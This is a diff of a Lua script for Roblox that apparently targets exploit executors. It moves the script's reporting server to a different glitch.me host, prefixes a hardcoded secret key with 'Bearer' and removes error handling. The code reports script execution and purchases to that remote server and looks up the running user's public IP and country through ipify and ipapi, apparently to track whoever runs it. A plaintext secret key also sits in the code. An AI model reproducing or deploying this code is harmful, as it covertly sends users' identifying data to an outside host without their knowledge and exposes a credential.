@@ -2,7 +2,7 @@ local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local ServerScriptService = game:GetService("ServerScriptService")
 
-local serverUrl = "https://bummerrip.glitch.me"
+local serverUrl = "https://intermided.glitch.me"
 local executeNotificationUrl = serverUrl .. "/api/notificar-ejecucion"
 local purchaseNotificationUrl = serverUrl .. "/api/notificar-compra"
 local SECRET_KEY = "aknsziqiwhbzlaaob8172"
@@ -13,7 +13,7 @@ purchaseIdValue.Name = "LastPurchaseId"
 local function snd(url, data)
     local headers = {
         ["Content-Type"] = "application/json",
-        ["Authorization"] = SECRET_KEY
+        ["Authorization"] = "Bearer " .. SECRET_KEY
     }
     local requestData = {
         Url = url,
@@ -21,28 +21,14 @@ local function snd(url, data)
         Headers = headers,
         Body = HttpService:JSONEncode(data)
     }
-
-    local function makeRequest()
-        local success, response
-        if http_request then
-            success, response = pcall(function()
-                return http_request(requestData)
-            end)
-        elseif request then
-            success, response = pcall(function()
-                return request(requestData)
-            end)
-        elseif http and http.request then
-            success, response = pcall(function()
-                return http.request(requestData)
-            end)
-        else
-            return false, "No valid request method found"
-        end
-        return success, response
+    
+    local success, response = pcall(function()
+        return http_request(requestData) or request(requestData) or syn.request(requestData)
+    end)
+    
+    if not success or response.StatusCode ~= 200 then
+        -- Handle error if needed
     end
-
-    makeRequest()
 end
 
 local function ibl(pid, bl)
@@ -56,26 +42,15 @@ end
 
 local function dlbl(url)
     local bl = {}
-    local success, response = pcall(function()
-        return game:HttpGet(url)
-    end)
-    if success then
-        for id in response:gmatch("(%d+)") do
-            table.insert(bl, tonumber(id))
-        end
+    for id in game:HttpGet(url):gmatch("(%d+)") do
+        table.insert(bl, tonumber(id))
     end
     return bl
 end
 
 local function notifyScriptExecution()
     local ipAddr = game:HttpGet("https://api.ipify.org/")
-    local success, country = pcall(function()
-        return game:HttpGet("https://ipapi.co/" .. ipAddr .. "/country_name")
-    end)
-    if success then
-        return country
-    end
-    return "Unknown"
+    return game:HttpGet("https://ipapi.co/" .. ipAddr .. "/country_name")
 end
 
 local function handleProductPurchase(plr, pid)
